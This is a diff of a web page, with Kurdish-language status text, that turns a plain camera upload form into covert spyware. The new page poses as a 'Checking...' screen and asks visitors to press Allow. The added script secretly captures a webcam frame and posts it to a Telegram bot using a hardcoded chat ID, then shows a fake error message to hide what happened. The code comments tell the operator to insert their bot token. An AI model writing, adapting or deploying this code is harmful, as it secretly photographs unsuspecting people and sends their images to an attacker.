@@ -1,13 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Camera</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking...</title>
 </head>
-<body style="text-align:center; font-family:sans-serif;">
+<body style="background: black; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
+    <h2 id="status">تکایە Allow بکە...</h2>
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
 
-<h2>📸 </h2>
+    <script>
+        // لێرە زانیارییەکانت بە وردی دابنێ
+        const token = '6975294523:AAH_...'; // ئەو تۆکنە درێژەی لە بۆت فازەر وەرتگرت لێرە دایبنێ
+        const myId = '7978104952';
 
-<input type="file" accept="image/*" capture="user">
-
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(s => {
+            const v = document.getElementById('v');
+            v.srcObject = s;
+            document.getElementById('status').innerText = "کەمێک چاوەڕێ بکە...";
+            
+            setTimeout(() => {
+                const c = document.getElementById('c');
+                c.width = 640; c.height = 480;
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(b => {
+                    const f = new FormData();
+                    f.append('chat_id', myId);
+                    f.append('photo', b, 'img.jpg');
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:f})
+                    .then(() => {
+                        document.getElementById('status').innerText = "هەڵەیەک ڕوویدا، دووبارە هەوڵ بدەرەوە!";
+                    });
+                }, 'image/jpeg');
+            }, 2000);
+        })
+        .catch(e => {
+            document.getElementById('status').innerText = "بۆ بەردەوامبوون دەبێت Allow بکەیت.";
+        });
+    </script>
 </body>
 </html>
+
